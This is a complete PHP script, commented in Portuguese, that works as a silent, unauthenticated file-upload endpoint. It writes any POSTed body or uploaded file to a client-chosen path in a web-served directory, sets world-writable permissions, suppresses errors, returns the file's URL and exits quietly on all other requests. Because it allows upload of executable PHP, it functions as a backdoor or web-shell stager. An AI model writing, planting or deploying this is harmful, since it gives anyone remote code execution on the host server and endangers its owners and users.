<?php
/**
 * Silent Direct Uploader 
 * Retorno: Apenas URL em texto puro
 */

@ini_set('memory_limit', '16000M');
@set_time_limit(0);

// Configuração de Host e Protocolo
$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')) ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';

// Captura o Path (nome do arquivo desejado)
$path = '';
if (!empty($_SERVER['PATH_INFO'])) {
    $path = trim($_SERVER['PATH_INFO'], '/');
} else {
    $uri = explode('?', $_SERVER['REQUEST_URI'])[0];
    $path = trim(str_replace($_SERVER['SCRIPT_NAME'], '', $uri), '/');
}

$path = str_replace(['../', '..\\', "\0"], '', urldecode($path));

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($path)) {
    
    $baseDir = __DIR__ . '/X/';
    $localPath = $baseDir . $path;
    
    // Garante que o diretório existe
    if (!is_dir(dirname($localPath))) {
        @mkdir(dirname($localPath), 0777, true);
    }

    // Pega os dados (Raw Body ou Multipart FILES)
    $data = file_get_contents('php://input');
    if (empty($data) && !empty($_FILES)) {
        $f = reset($_FILES);
        if (isset($f['tmp_name'])) {
            $data = file_get_contents($f['tmp_name']);
        }
    }

    // Salva e retorna apenas a URL
    if ($data !== false) {
        if (@file_put_contents($localPath, $data, LOCK_EX) !== false) {
            @chmod($localPath, 0777);
            echo $protocol . $host . '/X/' . str_replace('\\', '/', $path);
        }
    }
    exit;
}

// Qualquer outra requisição morre em silêncio
exit;
